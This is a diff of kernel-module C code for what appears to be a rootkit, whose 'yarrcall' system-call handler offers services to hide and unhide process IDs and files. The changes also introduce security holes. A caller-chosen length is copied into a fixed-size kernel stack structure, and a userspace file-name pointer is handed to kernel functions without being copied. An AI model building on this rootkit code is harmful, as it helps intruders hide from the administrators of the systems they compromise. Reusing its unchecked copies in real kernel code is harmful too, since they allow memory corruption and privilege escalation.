@@ -17,7 +17,7 @@ const char *__YARRCALL_SERVICE_MAP[] = {
     "__SHOW_STACKS"
 };
 
-static const char * __enum2str(enum YARRCALL_SERVICE svc) {
+static const char * __enum2str(enum yarrcall_service svc) {
     switch (svc) {
         case HIDE_PID:
             return __YARRCALL_SERVICE_MAP[HIDE_PID];
@@ -61,31 +61,32 @@ int yarrcall_finish(void) {
     return 0;
 }
 
+/* The entry point from userland context. */
 asmlinkage long entry_yarrcall(struct pt_regs *regs) {
-    return do_yarrcall((int)(regs->di), (YarrcallArgs_t *)(regs->si));
+    return do_yarrcall((YarrcallArgs_t *)(regs->di), (size_t)(regs->si));
 }
 
-long do_yarrcall(int svc, YarrcallArgs_t __user *args) {
+long do_yarrcall(YarrcallArgs_t __user *args, size_t args_size) {
     YarrcallArgs_t local_args;
     int err;
-    char to[128];
+    size_t fname_len;
+    char *fname;
+    enum yarrcall_service svc;
 
-    yarr_log("Requested service %s", __enum2str(svc));
-
-    // TODO: For now all yarrcalls needs arguments so do this check here, but
-    // as soon as one yarrcall doesn't have arguments we need to change it.
     if (args == NULL) {
         yarr_log("Arguments are NULL");
         return -1;
     }
 
-    // The pointer comes from user context and we are in kernel context right
-    // here so we need to copy from userspace.
-    err = copy_from_user(&local_args, args, sizeof(local_args));
+    err = copy_from_user(&local_args, args, args_size);
     if (err) {
         yarr_log("Error copying arguments from userspace");
         return -1;
     }
+
+    svc = local_args.svc;
+    yarr_log("Requested service %s", __enum2str(svc));
+    yarr_log("Size passed is %lu", args_size);
 
     switch (svc) {
         case HIDE_PID:
@@ -97,13 +98,16 @@ long do_yarrcall(int svc, YarrcallArgs_t __user *args) {
             break;
 
         case HIDE_FILE:
-            copy_from_user(to, local_args.hidefile_args.fname, 127);
-            err = hide_file(to);
+            fname_len = local_args.hidefile_args.size;
+            fname = local_args.hidefile_args.fname;
+            yarr_log("File to hide: %s", fname);
+            err = hide_file(fname);
             break;
 
         case UNHIDE_FILE:
-            copy_from_user(to, local_args.hidefile_args.fname, 127);
-            err = unhide_file(to);
+            fname = local_args.hidefile_args.fname;
+            yarr_log("File to unhide: %s", fname);
+            err = unhide_file(fname);
             break;
 
         case __GET_PROC_INFO:
